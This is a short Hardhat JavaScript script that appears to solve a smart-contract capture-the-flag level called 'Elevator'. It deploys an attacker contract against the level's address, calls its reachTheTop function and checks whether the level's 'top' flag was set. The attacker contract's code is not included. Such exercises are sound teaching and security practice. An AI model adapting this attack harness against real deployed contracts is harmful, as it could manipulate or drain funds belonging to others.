const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0x9E48cED9909710B7cBFDA357ff829F9CD40206E8";
    contractName = "Elevator";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    // const level = await Level.deploy();
    console.log(`Level at address ${levelAddress}`);
    const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    const attacker = await Attacker.deploy(levelAddress,{value: hre.ethers.utils.parseEther("0.001")});
    console.log(`Attacker at ${attacker.address}`);

    let tx = await attacker.reachTheTop();
    let tr = await tx.wait();

    let result = await level.top();
    console.log(result);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
